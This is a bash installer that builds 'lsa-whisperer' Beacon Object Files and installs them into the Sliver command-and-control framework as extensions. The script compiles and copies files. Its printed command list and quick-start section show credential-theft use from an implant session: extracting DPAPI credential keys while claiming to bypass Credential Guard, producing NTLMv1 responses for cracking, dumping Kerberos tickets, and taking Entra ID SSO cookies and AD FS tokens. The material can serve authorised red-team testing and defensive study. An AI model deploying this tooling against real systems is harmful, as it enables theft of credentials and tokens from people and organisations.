#!/bin/bash
# lsa-whisperer BOF - Build and install into Sliver armory
#
# This script:
#   1. Installs mingw-w64 cross-compiler if not present
#   2. Builds all three BOF modules (msv1_0, kerberos, cloudap)
#   3. Installs the extension into Sliver's local extensions directory
#   4. Creates armory package (tar.gz) for distribution
#
# Usage: ./install.sh [--build-only] [--install-only]

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="${SCRIPT_DIR}/build"
SLIVER_EXT_DIR="${HOME}/.sliver-client/extensions/lsa-whisperer"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[-]${NC} $1"; }

# ── Check/install dependencies ──────────────────────────────
check_deps() {
    info "Checking build dependencies..."

    if ! command -v x86_64-w64-mingw32-gcc &>/dev/null; then
        warn "mingw-w64 not found. Installing..."
        if command -v apt &>/dev/null; then
            sudo apt update && sudo apt install -y gcc-mingw-w64-x86-64 gcc-mingw-w64-i686
        elif command -v dnf &>/dev/null; then
            sudo dnf install -y mingw64-gcc mingw32-gcc
        elif command -v pacman &>/dev/null; then
            sudo pacman -S --noconfirm mingw-w64-gcc
        elif command -v brew &>/dev/null; then
            brew install mingw-w64
        else
            err "Cannot install mingw-w64 automatically. Please install manually."
            exit 1
        fi
    fi

    ok "Build dependencies satisfied"
}

# ── Build BOFs ───────────────────────────────────────────────
build() {
    info "Building lsa-whisperer BOF modules..."
    cd "${SCRIPT_DIR}"
    make clean
    make all

    if [ ! -f "${BUILD_DIR}/msv1_0_bof.x64.o" ] || \
       [ ! -f "${BUILD_DIR}/kerberos_bof.x64.o" ] || \
       [ ! -f "${BUILD_DIR}/cloudap_bof.x64.o" ]; then
        err "Build failed - missing output files"
        exit 1
    fi

    ok "All BOF modules built successfully"
    echo ""
    echo "  Built files:"
    ls -la "${BUILD_DIR}"/*.o 2>/dev/null | while read line; do
        echo "    ${line}"
    done
}

# ── Install to Sliver extensions ─────────────────────────────
install_extension() {
    info "Installing to Sliver extensions directory..."

    mkdir -p "${SLIVER_EXT_DIR}"

    # Copy extension manifest
    cp "${SCRIPT_DIR}/extension.json" "${SLIVER_EXT_DIR}/"

    # Copy BOF object files
    cp "${BUILD_DIR}/msv1_0_bof.x64.o"   "${SLIVER_EXT_DIR}/"
    cp "${BUILD_DIR}/msv1_0_bof.x86.o"   "${SLIVER_EXT_DIR}/"
    cp "${BUILD_DIR}/kerberos_bof.x64.o"  "${SLIVER_EXT_DIR}/"
    cp "${BUILD_DIR}/kerberos_bof.x86.o"  "${SLIVER_EXT_DIR}/"
    cp "${BUILD_DIR}/cloudap_bof.x64.o"   "${SLIVER_EXT_DIR}/"
    cp "${BUILD_DIR}/cloudap_bof.x86.o"   "${SLIVER_EXT_DIR}/"

    # Set permissions (Sliver convention: 700 dirs, 600 files)
    chmod 700 "${SLIVER_EXT_DIR}"
    chmod 600 "${SLIVER_EXT_DIR}"/*

    ok "Extension installed to: ${SLIVER_EXT_DIR}"
    echo ""
    echo "  Installed commands:"
    echo "    lsa-credkey        - Extract DPAPI credential keys (bypasses Credential Guard)"
    echo "    lsa-strongcredkey  - Extract enhanced credential keys (Win10+)"
    echo "    lsa-ntlmv1         - Generate NTLMv1 response for cracking"
    echo "    lsa-klist          - List cached Kerberos tickets"
    echo "    lsa-dump           - Export tickets as base64 .kirbi"
    echo "    lsa-purge          - Purge cached Kerberos tickets"
    echo "    lsa-ssocookie      - Get Entra ID SSO cookie"
    echo "    lsa-devicessocookie - Get device-level SSO cookie"
    echo "    lsa-enterprisesso  - Get AD FS enterprise SSO token"
    echo "    lsa-cloudinfo      - Query cloud provider status"
}

# ── Create distributable package ─────────────────────────────
create_package() {
    info "Creating armory distribution package..."
    cd "${SCRIPT_DIR}"
    make package
    ok "Package ready: ${BUILD_DIR}/lsa-whisperer.tar.gz"
}

# ── Main ─────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║  lsa-whisperer BOF - Sliver Armory Installer    ║"
echo "║  LSASS credential extraction via LSA APIs       ║"
echo "║  Original: github.com/dazzyddos/lsawhisper-bof  ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

case "${1:-}" in
    --build-only)
        check_deps
        build
        ;;
    --install-only)
        if [ ! -f "${BUILD_DIR}/msv1_0_bof.x64.o" ]; then
            err "BOFs not built yet. Run without --install-only first."
            exit 1
        fi
        install_extension
        ;;
    --package-only)
        if [ ! -f "${BUILD_DIR}/msv1_0_bof.x64.o" ]; then
            err "BOFs not built yet. Run without --package-only first."
            exit 1
        fi
        create_package
        ;;
    *)
        check_deps
        build
        install_extension
        create_package
        echo ""
        ok "=== Installation complete ==="
        echo ""
        info "To use in Sliver:"
        echo "    1. Ensure coff-loader is installed:  armory install coff-loader"
        echo "    2. Restart Sliver client (or use:    extensions load ${SLIVER_EXT_DIR})"
        echo "    3. Available in any active session"
        echo ""
        info "Quick start:"
        echo "    sliver (IMPLANT) > lsa-klist                     # List Kerberos tickets"
        echo "    sliver (IMPLANT) > lsa-dump                      # Dump all tickets as .kirbi"
        echo "    sliver (IMPLANT) > lsa-credkey                   # Extract DPAPI credential key"
        echo "    sliver (IMPLANT) > lsa-ntlmv1                    # NTLMv1 for crack.sh"
        echo "    sliver (IMPLANT) > lsa-ssocookie                 # Entra ID SSO token"
        echo "    sliver (IMPLANT) > lsa-cloudinfo                 # Azure AD join status"
        echo ""
        info "For other sessions (requires SYSTEM):"
        echo "    sliver (IMPLANT) > lsa-dump --luid 0x3e7         # SYSTEM session"
        echo "    sliver (IMPLANT) > lsa-klist --luid 0x12345      # Specific session"
        echo ""
        ;;
esac
